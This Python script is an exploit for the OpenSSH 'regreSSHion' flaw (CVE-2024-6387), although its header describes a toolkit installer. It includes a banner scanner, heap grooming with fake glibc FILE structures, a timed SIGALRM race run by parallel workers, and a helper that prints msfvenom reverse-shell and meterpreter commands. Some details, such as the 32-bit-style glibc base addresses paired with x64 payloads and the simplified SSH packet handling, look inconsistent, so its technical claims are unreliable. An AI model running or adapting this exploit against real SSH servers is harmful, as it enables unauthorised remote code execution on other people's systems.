#!/usr/bin/env python3
# =============================================================================
# VAPT Toolkit - Vulnerability Assessment and Penetration Testing Toolkit
# =============================================================================
#
# Author: Keith Pachulski
# Company: Red Cell Security, LLC
# Email: keith@redcellsecurity.org
# Website: www.redcellsecurity.org
#
# Copyright (c) 2025 Keith Pachulski. All rights reserved.
#
# License: This software is licensed under the MIT License.
#          You are free to use, modify, and distribute this software
#          in accordance with the terms of the license.
#
# Purpose: This script provides an automated installation and management system
#          for a vulnerability assessment and penetration testing
#          toolkit. It installs and configures security tools across multiple
#          categories including exploitation, web testing, network scanning,
#          mobile security, cloud security, and Active Directory testing.
#
# DISCLAIMER: This software is provided "as-is," without warranty of any kind,
#             express or implied, including but not limited to the warranties
#             of merchantability, fitness for a particular purpose, and non-infringement.
#             In no event shall the authors or copyright holders be liable for any claim,
#             damages, or other liability, whether in an action of contract, tort, or otherwise,
#             arising from, out of, or in connection with the software or the use or other dealings
#             in the software.
#
# NOTICE: This toolkit is intended for authorized security testing only.
#         Users are responsible for ensuring compliance with all applicable laws
#         and regulations. Unauthorized use of these tools may violate local,
#         state, federal, and international laws.
#
# =============================================================================

import socket
import struct
import time
import sys
import argparse
from typing import Optional, Tuple, List
from multiprocessing import Process, Queue, Value
from threading import Thread
import queue as queue_module

# ============================================================================
# CONSTANTS AND CONFIGURATION
# ============================================================================

MAX_PACKET_SIZE = 256 * 1024
LOGIN_GRACE_TIME = 120
CHUNK_ALIGN = lambda s: (s + 15) & ~15

# Glibc base addresses for different systems
GLIBC_BASES = {
    'ubuntu_18_04': [0xb7200000, 0xb7400000, 0xb7600000],
    'ubuntu_20_04': [0xb7000000, 0xb7200000, 0xb7400000],
    'ubuntu_22_04': [0xb6e00000, 0xb7000000, 0xb7200000],
    'debian_10': [0xb7100000, 0xb7300000, 0xb7500000],
    'debian_11': [0xb6f00000, 0xb7100000, 0xb7300000],
    'default': [0xb7200000, 0xb7400000, 0xb7600000, 0xb6e00000]
}

# Glibc offsets for exploitation
GLIBC_OFFSETS = {
    'ubuntu_20_04': {
        'io_wfile_jumps': 0x21ba00,
        'codecvt': 0x21dab8,
    },
    'ubuntu_22_04': {
        'io_wfile_jumps': 0x21c740,
        'codecvt': 0x21e7f8,
    },
    'default': {
        'io_wfile_jumps': 0x21b740,
        'codecvt': 0x21d7f8,
    }
}

# Shellcode placeholder - replace with actual payload
SHELLCODE = b"\x90" * 4

# Vulnerable OpenSSH versions
VULNERABLE_VERSIONS = [
    'OpenSSH_8.5', 'OpenSSH_8.6', 'OpenSSH_8.7', 'OpenSSH_8.8',
    'OpenSSH_8.9', 'OpenSSH_9.0', 'OpenSSH_9.1', 'OpenSSH_9.2',
    'OpenSSH_9.3', 'OpenSSH_9.4', 'OpenSSH_9.5', 'OpenSSH_9.6',
    'OpenSSH_9.7'
]


# ============================================================================
# UTILITY FUNCTIONS
# ============================================================================

def identify_os_from_banner(banner: str) -> str:
    """Identify target OS from SSH banner"""
    if 'Ubuntu' in banner:
        if 'Ubuntu-3ubuntu' in banner or '22.04' in banner:
            return 'ubuntu_22_04'
        elif 'Ubuntu-1ubuntu' in banner or '20.04' in banner:
            return 'ubuntu_20_04'
        return 'ubuntu_20_04'
    elif 'Debian' in banner:
        if '11' in banner:
            return 'debian_11'
        return 'debian_10'
    return 'default'


def is_vulnerable_version(banner: str) -> Tuple[bool, str]:
    """Check if SSH version is vulnerable"""
    for version in VULNERABLE_VERSIONS:
        if version in banner:
            return True, version
    return False, banner


def get_glibc_bases(os_type: str) -> List[int]:
    """Get glibc base addresses for OS type"""
    return GLIBC_BASES.get(os_type, GLIBC_BASES['default'])


def get_glibc_offsets(os_type: str) -> dict:
    """Get glibc offsets for OS type"""
    return GLIBC_OFFSETS.get(os_type, GLIBC_OFFSETS['default'])


def generate_msfvenom_command(lhost: str, lport: int, payload_type: str = 'reverse_shell') -> str:
    """Generate msfvenom command for payload creation"""
    if payload_type == 'reverse_shell':
        return f"msfvenom -p linux/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f python -v SHELLCODE"
    elif payload_type == 'bind_shell':
        return f"msfvenom -p linux/x64/shell_bind_tcp LPORT={lport} -f python -v SHELLCODE"
    elif payload_type == 'meterpreter':
        return f"msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f python -v SHELLCODE"
    else:
        return "Unknown payload type"


# ============================================================================
# VULNERABILITY SCANNER
# ============================================================================

class VulnerabilityScanner:
    """Scan target for CVE-2024-6387 vulnerability"""

    def __init__(self, target: str, port: int = 22):
        self.target = target
        self.port = port

    def connect(self) -> Optional[socket.socket]:
        """Establish connection to SSH server"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((self.target, self.port))
            return sock
        except Exception as e:
            print(f"[-] Connection failed: {e}")
            return None

    def get_banner(self, sock: socket.socket) -> Optional[str]:
        """Retrieve SSH banner"""
        try:
            banner = sock.recv(256).decode('utf-8', errors='ignore')
            return banner.strip()
        except Exception as e:
            print(f"[-] Failed to receive banner: {e}")
            return None

    def scan(self) -> Tuple[bool, dict]:
        """
        Scan target for vulnerability

        Returns:
            (is_vulnerable, details_dict)
        """
        print(f"[*] Scanning {self.target}:{self.port}")

        sock = self.connect()
        if not sock:
            return False, {'error': 'Connection failed'}

        try:
            banner = self.get_banner(sock)
            if not banner:
                return False, {'error': 'No banner received'}

            print(f"[*] Banner: {banner}")

            is_vuln, version = is_vulnerable_version(banner)
            os_type = identify_os_from_banner(banner)
            bases = get_glibc_bases(os_type)

            details = {
                'banner': banner,
                'version': version,
                'vulnerable': is_vuln,
                'os_type': os_type,
                'glibc_bases': bases
            }

            if is_vuln:
                print(f"[+] Target appears VULNERABLE")
                print(f"[+] Detected OS: {os_type}")
                print(f"[+] Suggested glibc bases: {[hex(b) for b in bases[:3]]}")
            else:
                print(f"[-] Target does NOT appear vulnerable")
                print(f"[*] Version {version} not in known vulnerable list")

            return is_vuln, details

        finally:
            sock.close()


# ============================================================================
# EXPLOITATION WORKER
# ============================================================================

class ExploitWorker:
    """Individual worker for exploitation attempt"""

    def __init__(self, target_ip: str, target_port: int, worker_id: int,
                 glibc_base: int, results_queue: Queue, verbose: bool = False):
        self.target_ip = target_ip
        self.target_port = target_port
        self.worker_id = worker_id
        self.glibc_base = glibc_base
        self.results_queue = results_queue
        self.verbose = verbose
        self.sock: Optional[socket.socket] = None
        self.connection_start = 0.0

    def log(self, message: str):
        """Worker logging"""
        if self.verbose:
            print(f"[W{self.worker_id:03d}] {message}")

    def setup_connection(self) -> bool:
        """Establish TCP connection"""
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            self.sock.settimeout(30)
            self.sock.connect((self.target_ip, self.target_port))
            self.connection_start = time.perf_counter()
            self.log("Connected")
            return True
        except Exception as e:
            self.log(f"Connection failed: {e}")
            return False

    def send_ssh_version(self):
        """Send SSH protocol version"""
        version = b"SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1\r\n"
        self.sock.sendall(version)

    def receive_ssh_version(self) -> bool:
        """Receive SSH version from server"""
        try:
            version = self.sock.recv(256)
            return len(version) > 0
        except:
            return False

    def send_packet(self, packet_type: int, data: bytes):
        """Send SSH protocol packet"""
        packet_len = len(data) + 1
        packet = struct.pack('>I', packet_len)
        packet += bytes([0, packet_type])
        packet += data

        self.sock.sendall(packet)
        time.sleep(0.001)  # Small delay to prevent buffer overflow

    def send_kex_init(self):
        """Send SSH Key Exchange Init"""
        self.send_packet(20, b'\x00' * 36)  # SSH_MSG_KEXINIT

    def receive_kex_init(self) -> bool:
        """Receive Key Exchange Init"""
        try:
            data = self.sock.recv(4096)
            return len(data) > 0
        except:
            return False

    def perform_ssh_handshake(self) -> bool:
        """Complete SSH protocol handshake"""
        try:
            self.send_ssh_version()
            if not self.receive_ssh_version():
                return False
            self.send_kex_init()
            if not self.receive_kex_init():
                return False
            self.log("Handshake complete")
            return True
        except Exception as e:
            self.log(f"Handshake failed: {e}")
            return False

    def create_fake_file_structure(self, size: int, glibc_base: int) -> bytes:
        """
        Create fake FILE structure for exploitation
        Exploits _IO_wfile_jumps vtable
        """
        data = bytearray(size)

        # Set _vtable_offset to 0x61
        struct.pack_into('<Q', data, 0xd8, 0x61)

        # Fake vtable pointer (_IO_wfile_jumps)
        struct.pack_into('<Q', data, size - 16, glibc_base + 0x21b740)

        # Fake _codecvt pointer
        struct.pack_into('<Q', data, size - 8, glibc_base + 0x21d7f8)

        return bytes(data)

    def prepare_heap(self):
        """
        Heap grooming strategy for exploitation:
        - Packet a: Populate tcache with freed chunks
        - Packet b: Create 27 pairs of large/small holes
        - Packet c: Write fake FILE structures
        - Packet d: Large allocation to organize malloc bins
        """
        self.log("Preparing heap...")

        # Packet a: tcache population
        for i in range(10):
            self.send_packet(5, b'A' * 64)  # SSH_MSG_IGNORE

        # Packet b: 27 large/small chunk pairs
        for i in range(27):
            self.send_packet(5, b'B' * 8192)  # Large chunk
            self.send_packet(5, b'C' * 320)   # Small chunk (FILE size)

        # Packet c: fake FILE structures
        for i in range(27):
            fake_data = self.create_fake_file_structure(4096, self.glibc_base)
            self.send_packet(5, fake_data)

        # Packet d: large allocation
        self.send_packet(5, b'E' * (MAX_PACKET_SIZE - 100))

        self.log("Heap prepared")

    def create_public_key_packet(self, glibc_base: int) -> bytes:
        """
        Create malicious public key packet with:
        - Heap spray pattern
        - Fake FILE structures
        - Shellcode payload
        """
        packet = bytearray(MAX_PACKET_SIZE)
        packet[0:8] = b"ssh-rsa "
        offset = 8

        # Create 27 allocation pairs
        for i in range(27):
            # Large chunk marker
            struct.pack_into('<I', packet, offset, CHUNK_ALIGN(4096))
            offset += CHUNK_ALIGN(4096)

            # Small chunk with fake FILE structure
            fake_file = self.create_fake_file_structure(CHUNK_ALIGN(304), glibc_base)
            packet[offset:offset+len(fake_file)] = fake_file
            offset += CHUNK_ALIGN(304)

        # Embed shellcode at calculated offset
        shellcode_offset = CHUNK_ALIGN(4096) * 13 + CHUNK_ALIGN(304) * 13
        packet[shellcode_offset:shellcode_offset+len(SHELLCODE)] = SHELLCODE

        return bytes(packet)

    def measure_parsing_time(self) -> float:
        """Measure server parsing time for timing attack"""
        try:
            error_packet = b"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAAQQDZy9"
            start = time.perf_counter()
            self.send_packet(50, error_packet)  # SSH_MSG_USERAUTH_REQUEST

            try:
                self.sock.settimeout(2)
                self.sock.recv(1024)
            except:
                pass

            return time.perf_counter() - start
        except:
            return 0.01  # Default estimate

    def attempt_race_condition(self, parsing_time: float) -> bool:
        """
        Execute race condition exploit:
        1. Wait until near LOGIN_GRACE_TIME
        2. Send malicious packet minus last byte
        3. Precisely time final byte so parsing happens during SIGALRM
        """
        final_packet = self.create_public_key_packet(self.glibc_base)

        # Calculate when to send based on connection start
        elapsed = time.perf_counter() - self.connection_start
        wait_time = LOGIN_GRACE_TIME - elapsed - parsing_time - 1.0

        if wait_time < 0:
            self.log("Warning: timing drift detected")
            return False

        self.log(f"Waiting {wait_time:.1f}s for race window (T+{elapsed:.1f}s)")
        time.sleep(wait_time)

        try:
            # Send all but last byte
            self.sock.sendall(final_packet[:-1])
            self.log("Sent malicious packet (minus last byte)")

            # Precise timing for final byte
            race_start = time.perf_counter()
            target_delay = parsing_time - 0.001  # 1ms before SIGALRM

            while (time.perf_counter() - race_start) < target_delay:
                time.sleep(0.0001)  # 100Î¼s granularity

            # Send final byte - triggers parsing during SIGALRM handler
            self.sock.send(final_packet[-1:])

            elapsed_total = time.perf_counter() - self.connection_start
            self.log(f"Final byte sent at T+{elapsed_total:.3f}s")

            # Check for exploitation success
            time.sleep(0.5)
            try:
                self.sock.settimeout(2)
                response = self.sock.recv(1024)

                if response and not response.startswith(b"SSH-2.0-"):
                    self.log("*** POSSIBLE HIT - Non-SSH response ***")
                    return True
                elif not response:
                    self.log("*** POSSIBLE HIT - Connection closed ***")
                    return True
            except socket.timeout:
                self.log("*** POSSIBLE HIT - Server timeout ***")
                return True

        except Exception as e:
            self.log(f"Race attempt failed: {e}")

        return False

    def run_attempt(self) -> bool:
        """Execute complete exploitation attempt"""
        try:
            if not self.setup_connection():
                return False

            if not self.perform_ssh_handshake():
                self.log("Handshake failed")
                return False

            self.prepare_heap()

            self.log("Measuring timing...")
            parsing_time = self.measure_parsing_time()
            self.log(f"Parsing time: {parsing_time:.4f}s")

            self.log("Executing race condition...")
            return self.attempt_race_condition(parsing_time)

        except Exception as e:
            self.log(f"Attempt failed: {e}")
            return False
        finally:
            if self.sock:
                try:
                    self.sock.close()
                except:
                    pass


# ============================================================================
# WORKER PROCESS FUNCTION
# ============================================================================

def worker_process(target_ip: str, target_port: int, worker_id: int,
                   glibc_bases: list, results_queue: Queue,
                   attempt_counter: Value, verbose: bool):
    """Worker process that runs continuous exploitation attempts"""

    # Start each worker at a different base to distribute attempts
    # Worker 0 starts with base[0], Worker 1 with base[1], etc.
    base_index = worker_id % len(glibc_bases)

    while True:
        # Cycle through glibc bases
        glibc_base = glibc_bases[base_index % len(glibc_bases)]

        worker = ExploitWorker(
            target_ip, target_port, worker_id, glibc_base,
            results_queue, verbose
        )

        success = worker.run_attempt()

        # Increment attempt counter
        with attempt_counter.get_lock():
            attempt_counter.value += 1

        if success:
            # Report success and exit worker
            result = {
                'worker_id': worker_id,
                'success': True,
                'glibc_base': glibc_base,
                'timestamp': time.time(),
                'total_attempts': attempt_counter.value
            }
            results_queue.put(result)
            break

        base_index += 1
        time.sleep(0.1)

# ============================================================================
# PARALLEL EXPLOIT MANAGER
# ============================================================================

class ParallelExploitManager:
    """Manages parallel exploitation attempts"""

    def __init__(self, target_ip: str, target_port: int, num_workers: int,
                 os_type: str, verbose: bool):
        self.target_ip = target_ip
        self.target_port = target_port
        self.num_workers = num_workers
        self.os_type = os_type
        self.verbose = verbose
        self.results_queue = Queue()
        self.attempt_counter = Value('i', 0)
        self.workers = []
        self.start_time = 0.0
        self.glibc_bases = get_glibc_bases(os_type)

    def status_monitor(self):
        """Monitor and display status with base distribution"""
        while True:
            time.sleep(10)
            attempts = self.attempt_counter.value
            elapsed = time.time() - self.start_time
            rate = attempts / elapsed if elapsed > 0 else 0

            # Calculate expected distribution across bases
            attempts_per_base = attempts / len(self.glibc_bases) if attempts > 0 else 0

            print(f"\n[STATUS] Total Attempts: {attempts}")
            print(f"[STATUS] Time Elapsed: {elapsed/60:.1f} minutes")
            print(f"[STATUS] Rate: {rate:.3f} attempts/sec")
            print(f"[STATUS] Active Workers: {self.num_workers}")
            print(f"[STATUS] ~{attempts_per_base:.0f} attempts per glibc base ({len(self.glibc_bases)} bases)")

            if attempts > 0 and rate > 0:
                # Estimate time for statistical success (~10,000 attempts)
                remaining = (10000 - attempts) / rate if attempts < 10000 else 0
                print(f"[STATUS] Est. time to 10k attempts: {remaining/3600:.1f} hours")

    def run(self, max_attempts: int = 50000):
        """Run parallel exploitation"""
        print("=" * 70)
        print("CVE-2024-6387 (regreSSHion) Parallel Exploit")
        print("=" * 70)
        print(f"Target: {self.target_ip}:{self.target_port}")
        print(f"Workers: {self.num_workers}")
        print(f"OS Type: {self.os_type}")
        print(f"glibc bases: {[hex(b) for b in self.glibc_bases]}")
        print(f"Max Attempts: {max_attempts}")
        print(f"Note: Each worker runs 120s attempts in parallel")

        # Calculate efficiency
        serial_time = max_attempts * 120 / 3600  # hours
        parallel_time = (max_attempts / self.num_workers) * 120 / 3600  # hours
        print(f"\nEfficiency:")
        print(f"  Serial: {serial_time:.1f} hours")
        print(f"  Parallel: {parallel_time:.1f} hours")
        print(f"  Speedup: {serial_time/parallel_time:.1f}x")
        print("=" * 70)

        self.start_time = time.time()

        # Start status monitor thread
        monitor = Thread(target=self.status_monitor, daemon=True)
        monitor.start()

        # Launch worker processes
        print(f"\n[*] Launching {self.num_workers} workers...")
        for i in range(self.num_workers):
            p = Process(
                target=worker_process,
                args=(self.target_ip, self.target_port, i, self.glibc_bases,
                      self.results_queue, self.attempt_counter, self.verbose)
            )
            p.daemon = True
            p.start()
            self.workers.append(p)
            time.sleep(0.2)  # Stagger starts

        print(f"[+] All workers launched\n")

        # Monitor for results
        try:
            while self.attempt_counter.value < max_attempts:
                try:
                    result = self.results_queue.get(timeout=1)

                    if result.get('success'):
                        print("\n" + "=" * 70)
                        print("*** EXPLOITATION SUCCESSFUL ***")
                        print("=" * 70)
                        print(f"Worker ID: {result['worker_id']}")
                        print(f"glibc base: 0x{result['glibc_base']:x}")
                        print(f"Total attempts: {result['total_attempts']}")
                        print(f"Total time: {(time.time() - self.start_time)/60:.1f} minutes")
                        print("=" * 70)
                        print("\n[*] Verify access and document findings for report")

                        # Terminate workers
                        for p in self.workers:
                            p.terminate()

                        return True

                except queue_module.Empty:
                    continue

            print(f"\n[-] Max attempts ({max_attempts}) reached without success")
            print("[*] Target may be patched or parameters need adjustment")
            return False

        except KeyboardInterrupt:
            print("\n[!] Interrupted by user")
            for p in self.workers:
                p.terminate()
            return False


# ============================================================================
# COMMAND LINE INTERFACE
# ============================================================================

def cmd_scan(args):
    """Scan command handler"""
    scanner = VulnerabilityScanner(args.target, args.port)
    is_vuln, details = scanner.scan()

    if is_vuln:
        print("\n" + "=" * 70)
        print("RECOMMENDATION:")
        print("=" * 70)
        print("[+] Target appears vulnerable to CVE-2024-6387")
        print(f"\n[*] Proceed with exploitation:")
        print(f"    python3 {sys.argv[0]} exploit -t {args.target} -p {args.port}")
        print(f"\n[*] Suggested parameters:")
        print(f"    OS Type: {details['os_type']}")
        print(f"    Workers: 20-50 (depending on network)")
        print("=" * 70)
        return 0
    else:
        print("\n[-] Target does not appear vulnerable")
        return 1


def cmd_exploit(args):
    """Exploit command handler"""
    # Auto-detect OS type if not specified
    if not args.os_type:
        scanner = VulnerabilityScanner(args.target, args.port)
        is_vuln, details = scanner.scan()

        if not is_vuln:
            print("\n[-] Target does not appear vulnerable")
            print("[*] Proceeding anyway as requested...\n")

        os_type = details.get('os_type', 'default')
    else:
        os_type = args.os_type

    # Run parallel exploitation
    manager = ParallelExploitManager(
        args.target, args.port, args.workers, os_type, args.verbose
    )

    success = manager.run(args.attempts)
    return 0 if success else 1


def cmd_payload(args):
    """Payload generation command handler"""
    print("=" * 70)
    print("Payload Generation")
    print("=" * 70)

    if args.type == 'msfvenom':
        if not args.lhost or not args.lport:
            print("[-] For msfvenom payloads, --lhost and --lport required")
            return 1

        cmd = generate_msfvenom_command(args.lhost, args.lport, args.payload)
        print(f"\n[*] Run this command to generate payload:\n")
        print(f"    {cmd}\n")
        print("[*] Then replace SHELLCODE variable in this script")

    elif args.type == 'show':
        print("\nCurrent shellcode in script:")
        print(f"  Length: {len(SHELLCODE)} bytes")
        print(f"  Hex: {SHELLCODE.hex()}")
        print(f"\n[*] This is a NOP sled placeholder")
        print("[*] Replace with actual payload for exploitation")

    print("=" * 70)
    return 0


def main():
    parser = argparse.ArgumentParser(
        description='CVE-2024-6387 (regreSSHion) Complete Exploit',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Scan target
  %(prog)s scan -t 192.168.1.100

  # Exploit with 20 workers
  %(prog)s exploit -t 192.168.1.100 -w 20

  # Exploit with verbose output
  %(prog)s exploit -t 192.168.1.100 -w 20 -v

  # Generate payload
  %(prog)s payload --type msfvenom --lhost 192.168.1.50 --lport 4444
        """
    )

    subparsers = parser.add_subparsers(dest='command', help='Command to execute')

    # Scan command
    scan_parser = subparsers.add_parser('scan', help='Scan target for vulnerability')
    scan_parser.add_argument('-t', '--target', required=True,
                            help='Target IP or hostname')
    scan_parser.add_argument('-p', '--port', type=int, default=22,
                            help='SSH port (default: 22)')

    # Exploit command
    exploit_parser = subparsers.add_parser('exploit', help='Run exploitation')
    exploit_parser.add_argument('-t', '--target', required=True,
                               help='Target IP or hostname')
    exploit_parser.add_argument('-p', '--port', type=int, default=22,
                               help='SSH port (default: 22)')
    exploit_parser.add_argument('-w', '--workers', type=int, default=20,
                               help='Number of parallel workers (default: 20)')
    exploit_parser.add_argument('-a', '--attempts', type=int, default=50000,
                               help='Maximum total attempts (default: 50000)')
    exploit_parser.add_argument('-o', '--os-type',
                               choices=['ubuntu_18_04', 'ubuntu_20_04', 'ubuntu_22_04',
                                       'debian_10', 'debian_11', 'default'],
                               help='Target OS type (auto-detected if not specified)')
    exploit_parser.add_argument('-v', '--verbose', action='store_true',
                               help='Verbose worker output')

    # Payload command
    payload_parser = subparsers.add_parser('payload', help='Payload generation')
    payload_parser.add_argument('--type', choices=['msfvenom', 'show'], default='show',
                               help='Payload operation type')
    payload_parser.add_argument('--payload', default='reverse_shell',
                               choices=['reverse_shell', 'bind_shell', 'meterpreter'],
                               help='Payload type for msfvenom')
    payload_parser.add_argument('--lhost', help='Listener IP (for reverse shells)')
    payload_parser.add_argument('--lport', type=int, help='Listener port')

    args = parser.parse_args()

    if not args.command:
        parser.print_help()
        return 1

    # Route to command handler
    if args.command == 'scan':
        return cmd_scan(args)
    elif args.command == 'exploit':
        return cmd_exploit(args)
    elif args.command == 'payload':
        return cmd_payload(args)
    else:
        parser.print_help()
        return 1


if __name__ == '__main__':
    sys.exit(main())
